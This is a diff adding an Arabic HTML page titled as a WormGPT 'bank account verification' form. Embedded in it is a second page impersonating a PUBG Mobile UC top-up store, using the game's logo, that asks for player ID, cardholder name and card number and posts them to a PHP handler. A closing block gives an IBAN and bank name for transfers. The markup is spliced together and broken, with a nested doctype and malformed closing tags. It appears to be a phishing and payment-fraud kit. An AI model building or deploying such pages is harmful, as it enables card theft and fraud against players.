@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+ <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <title>توثيق الحساب البنكي | WormGPT</title>
+ <style>
+ body {
+ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+ background-color: #f0f2f5;
+ display: flex;
+ justify-content: center;
+ align-items: center;
+ height: 100vh;
+ margin: 0;
+ }
+.container {
+ background: white;
+ padding: 40px;
+ border-radius: 10px;
+ box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+ width: 100%;
+ max-width: 450px;
+ }
+ h2 {
+ text-align: center;
+ color: #333;
+ margin-bottom: 20px;
+ }
+.form-group {
+ margin-bottom: 15px;
+ }
+ label {
+ display: block;
+ margin-bottom: 5px;
+ color: #666;
+ font-size: 0.9em;
+ }
+ input {
+ width: 100%;
+ padding: 12px;
+ border: 1px solid #ddd;
+ border-radius: 5px;
+ box-sizing: border-box;
+ font-size: 1em;
+ }
+ input:focus {
+ border-color: #007bff;
+ outline: none;
+ }
+.cc-row {
+ display: flex;
+ gap: 10px;
+ }
+.submit-btn {
+ width: 100%;
+ padding: 15px;
+ background-color: #007bff;
+ color: white;
+ border: none;
+ border-radius: 5px;
+ font-size: 1.1em;
+ cursor: pointer;
+ transition: background 0.3s;
+ }
+.submit-btn:hover {
+ background-color: #0056b3;
+ }
+ </style>
+</head>
+<body>
+<form action="save_data.php" method="POST">
+
+<div class="container">
+ <h2>تحديث بيانات الدفع</h2>
+ <div class="form-group">
+  <label>طريقة الدفع</label>
+  <select name="payment_method">
+    <option value="التحويل البنكي">التحويل البنكي (IBAN)</option>
+    <option value="STC Pay">STC Pay</option>
+    <option value="Apple Pay">Apple Pay</option>
+  </select>
+<div class="form-group">
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>شحن شدات ببجي | PUBG Mobile</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            background-color: #121212;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .card {
+            background: #1e1e1e;
+            border: 2px solid #f39c12;
+            border-radius: 15px;
+            padding: 30px;
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 8px 25px rgba(243, 156, 18, 0.25);
+            text-align: center;
+        }
+        .logo {
+            width: 160px;
+            margin-bottom: 15px;
+        }
+        h2 {
+            color: #f39c12;
+            margin-bottom: 20px;
+            font-size: 22px;
+        }
+        .form-group {
+            text-align: right;
+            margin-bottom: 18px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #e0e0e0;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        input, select {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #444;
+            border-radius: 8px;
+            background-color: #2a2a2a;
+            color: #fff;
+            font-size: 15px;
+            outline: none;
+            transition: 0.3s;
+        }
+        input:focus, select:focus {
+            border-color: #f39c12;
+            box-shadow: 0 0 8px rgba(243, 156, 18, 0.4);
+        }
+        .btn {
+            background-color: #f39c12;
+            color: #000;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            width: 100%;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 10px;
+        }
+        .btn:hover {
+            background-color: #e67e22;
+            color: #fff;
+        }
+        .step {
+            display: none;
+        }
+        .step.active {
+            display: block;
+        }
+        .payment-info {
+            margin-top: 15px;
+            text-align: right;
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/e/ea/PUBG_Mobile_Logo.png" alt="PUBG Mobile" class="logo">
+    <h2>شحن شدات ببجي (UC)</h2>
+
+    <form action="process_payment.php" method="POST">
+        
+        <!-- الخطوة الأولى: معرف اللاعب واختيار الشدات -->
+        <div id="step-1" class="step active">
+            <div class="form-group">
+                <label for="player_id">معرف اللاعب (ID):</label>
+                <input type="text" id="player_id" name="player_id" placeholder="أدخل الآيدي الخاص بك هنا" required>
+            </div>
+
+            <div class="form-group">
+                <label for="uc_package">اختر باقة الشدات (UC):</label>
+                <select id="uc_package" name="uc_package" required>
+                    <option value="60">60 شدة - $1.00</option>
+                    <option value="325">325 شدة - $5.00</option>
+                    <option value="660">660 شدة - $10.00</option>
+                    <option value="1800">1800 شدة - $25.00</option>
+                    <option value="3850">3850 شدة - $50.00</option>
+                    <option value="8100">8100 شدة - $100.00</option>
+                    <option value="16200">16,200 شدة - $200.00</option>
+                    <option value="60000">60,000 شدة - $750.00</option>
+                    <option value="100000">100,000 شدة - $1,200.00</option>
+                </select>
+            </div>
+
+            <button type="button" class="btn" onclick="nextStep()">التالي ➔</button>
+        </div>
+
+        <!-- الخطوة الثانية: معلومات الدفع والتأكيد -->
+        <div id="step-2" class="step">
+            <div class="form-group">
+                <label for="payment_method">اختر طريقة الدفع:</label>
+                <select id="payment_method" name="payment_method" required>
+                    <option value="mastercard">ماستر كارد (MasterCard)</option>
+                    <option value="google_pay">جوجل باي (Google Pay)</option>
+                </select>
+            </div>
+
+            <div class="payment-info">
+                <div class="form-group">
+                    <label for="card_name">اسم حامل البطاقة:</label>
+                    <input type="text" id="card_name" name="card_name" placeholder="الاسم الكامل" required>
+                </div>
+                <div class="form-group">
+                    <label for="card_number">رقم البطاقة:</label>
+                    <input type="text" id="card_number" name="card_number" placeholder="0000 0000 0000 0000" required>
+                </div>
+            </div>
+
+            <button type="submit" class="btn" style="margin-top: 20px;">عملية شراء</button>
+            <button type="button" class="btn" style="background-color: #555; color: #fff; margin-top: 10px;" onclick="prevStep()">رجوع</button>
+        </div>
+
+    </form>
+</div>
+
+<script>
+    function nextStep() {
+        var playerId = document.getElementById('player_id').value;
+        if(playerId.trim() === "") {
+            alert("يرجى إدخال معرف اللاعب (ID) أولاً!");
+            return;
+        }
+        document.getElementById('step-1').classList.remove('active');
+        document.getElementById('step-2').classList.add('active');
+    }
+
+    function prevStep() {
+        document.getElementById('step-2').classList.remove('active');
+        document.getElementById('step-1').classList.add('active');
+    }
+</script>
+
+</body>
+</html>
+
+
+    </select>
+</div>
+
+
+<div class="payment-details" style="background-color: #334155; padding: 15px; border-radius: 8px; margin-top: 10px;">
+  <p style="color: #94a3b8; margin-bottom: 5px;">تفاصيل الحساب للتحويل:</p>
+  <p style="margin: 5px 0;"><strong>الآيبان:</strong> IT62U3608105138264545764576</p>
+  <p style="margin: 5px 0;"><strong>اسم البنك:</strong> Postepay Evolution</p>
+</form/>
+
+</script>
+
+
+
+
+
+
+
+</body>
+</html>
